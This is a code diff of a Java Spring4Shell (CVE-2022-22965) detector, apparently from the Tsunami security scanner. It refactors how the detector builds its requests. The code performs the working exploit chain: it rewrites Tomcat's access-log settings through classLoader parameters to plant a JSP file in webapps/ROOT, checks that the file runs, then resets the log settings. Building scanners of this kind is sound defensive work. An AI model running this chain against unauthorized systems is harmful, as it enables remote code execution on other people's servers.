@@ -1,5 +1,5 @@
 /*
- * Copyright 2022 Google LLC
+ * Copyright 2025 Google LLC
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -13,12 +13,14 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-package com.google.tsunami.plugins.detectors.spring;
+package com.google.tsunami.plugins.detectors.spring4shell;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
 import static com.google.tsunami.common.net.http.HttpRequest.get;
+import static com.google.tsunami.plugins.detectors.spring4shell.Annotations.DelayBetweenRequests;
 
+import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.collect.ImmutableMap;
 import com.google.common.flogger.GoogleLogger;
@@ -56,7 +58,6 @@ import java.time.Clock;
 import java.time.Duration;
 import java.time.Instant;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Objects;
@@ -79,37 +80,31 @@ public final class SpringCve202222965Detector implements VulnDetector {
   private static final String JSP_CONTENT_TEMPLATE =
           "<%@ page import=\"java.io.File\" %>\n{{PAYLOAD}}\n<% if(\"1\".equals(request.getParameter(\"delete\"))){ File thisFile=new File(application.getRealPath(request.getServletPath())); thisFile.delete(); out.println(\"Deleted\"); } %>//";
 
-  // It's important that fileDateFormat is never the same to be able to trigger the exploit more than once.
-  private static final String JSP_FILENAME_SUFFIX = String.valueOf(System.currentTimeMillis());
-  private static final String JSP_FILENAME_PREFIX = "Tsunami_";
-  private static final String JSP_FILENAME = JSP_FILENAME_PREFIX + JSP_FILENAME_SUFFIX;
-
   private static final String LOG_PATTERN_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.pattern";
+  private static final String LOG_FILE_SUFFIX_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.suffix";
+  private static final String LOG_FILE_PREFIX_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.prefix";
+  private static final String LOG_DIRECTORY_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.directory";
+  private static final String LOG_FILE_DATE_FORMAT_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat";
 
-  private static final Map<String, String> LOG_CONFIG_PARAMS = ImmutableMap.of(
-          "class.module.classLoader.resources.context.parent.pipeline.first.suffix", ".jsp",
-          "class.module.classLoader.resources.context.parent.pipeline.first.directory", "webapps/ROOT",
-          "class.module.classLoader.resources.context.parent.pipeline.first.prefix", JSP_FILENAME_PREFIX,
-          "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", JSP_FILENAME_SUFFIX
-  );
-  private static final Map<String, String> LOG_CONFIG_PARAMS_NULL = ImmutableMap.of(
-          "class.module.classLoader.resources.context.parent.pipeline.first.suffix", "",
-          "class.module.classLoader.resources.context.parent.pipeline.first.directory", "/dev",
-          "class.module.classLoader.resources.context.parent.pipeline.first.prefix", "null",
-          "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", "",
-          LOG_PATTERN_PARAM, ""
-  );
+  @VisibleForTesting
+  public static final String JSP_FILENAME_PREFIX = "Tsunami_";
 
   private final Clock utcClock;
   private final HttpClient httpClient;
   private final PayloadGenerator payloadGenerator;
-
+  private final int delayBetweenRequests;
+  private final String fileDateFormat;
+  private final String jspFileName;
 
   @Inject
-  SpringCve202222965Detector(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
+  SpringCve202222965Detector(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator, @DelayBetweenRequests int delayBetweenRequests) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
     this.payloadGenerator = checkNotNull(payloadGenerator);
+    this.delayBetweenRequests = delayBetweenRequests;
+    // It's important that fileDateFormat is always different to be able to trigger the exploit more than once.
+    this.fileDateFormat = String.valueOf(utcClock.millis());
+    this.jspFileName = JSP_FILENAME_PREFIX + fileDateFormat + ".jsp";
   }
 
   @Override
@@ -226,21 +221,26 @@ public final class SpringCve202222965Detector implements VulnDetector {
               .replace("%", "%{perc}i")
               .replace("Runtime", "%{rt}i");
 
-      Map<String, String> params = new HashMap<>(LOG_CONFIG_PARAMS);
-      params.put(LOG_PATTERN_PARAM, jspContent);
+      Map<String, String> exploitParams = ImmutableMap.of(
+              LOG_DIRECTORY_PARAM, "webapps/ROOT",
+              LOG_FILE_PREFIX_PARAM, JSP_FILENAME_PREFIX,
+              LOG_FILE_DATE_FORMAT_PARAM, this.fileDateFormat,
+              LOG_FILE_SUFFIX_PARAM, ".jsp",
+              LOG_PATTERN_PARAM, jspContent
+      );
 
       // Modifying logs configuration
       httpClient.send(
               HttpRequest.builder()
                       .setMethod(httpMethod)
-                      .setUrl(targetUri + "?" + buildQueryString(params))
+                      .setUrl(targetUri + "?" + buildQueryString(exploitParams))
                       .setHeaders(httpHeaders)
                       .build(),
               networkService
       );
 
       // Wait for changes to propagate
-      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(3));
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(delayBetweenRequests));
 
       // Send an arbitrary request to trigger the file writing
       // The headers are needed to generate the content correctly
@@ -260,15 +260,22 @@ public final class SpringCve202222965Detector implements VulnDetector {
       );
 
       // Wait for file to be written
-      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(3));
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(delayBetweenRequests));
 
       // Set the log file to /dev/null to prevent further data being written to the file
       // or accidentally leaving leftovers on the target
+      Map<String, String> resetParams = ImmutableMap.of(
+              LOG_DIRECTORY_PARAM, "/dev",
+              LOG_FILE_PREFIX_PARAM, "null",
+              LOG_FILE_DATE_FORMAT_PARAM, "",
+              LOG_FILE_SUFFIX_PARAM, "",
+              LOG_PATTERN_PARAM, ""
+      );
       logger.atInfo().log("Resetting log configuration.");
       httpClient.send(
               HttpRequest.builder()
                       .setMethod(httpMethod)
-                      .setUrl(targetUri + "?" + buildQueryString(LOG_CONFIG_PARAMS_NULL))
+                      .setUrl(targetUri + "?" + buildQueryString(resetParams))
                       .setHeaders(httpHeaders)
                       .build(),
               networkService
@@ -283,14 +290,14 @@ public final class SpringCve202222965Detector implements VulnDetector {
   private boolean checkUploadedJsp(String targetUri, NetworkService networkService, Payload payload) {
     List<String> urlsToCheck = new ArrayList<>();
     String tempUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
-    urlsToCheck.add(tempUrl + JSP_FILENAME + ".jsp");
+    urlsToCheck.add(tempUrl + this.jspFileName);
 
     // The JSP file may be in any subpath from our original target URI
     List<String> pathSegments = Objects.requireNonNull(HttpUrl.parse(targetUri)).pathSegments();
     if (pathSegments.size() > 1) {
       for(String segment: pathSegments) {
         tempUrl += segment + "/";
-        urlsToCheck.add(String.format("%s%s.jsp", tempUrl, JSP_FILENAME));
+        urlsToCheck.add(tempUrl + this.jspFileName);
       }
     }
 
@@ -303,7 +310,7 @@ public final class SpringCve202222965Detector implements VulnDetector {
         boolean executed;
         // If we get a 200, retry the request a few times as sometimes the contents haven't been written yet
         do {
-          Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(3));
+          Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(delayBetweenRequests));
           response = httpClient.send(
                   get(url)
                           .setHeaders(httpHeaders)
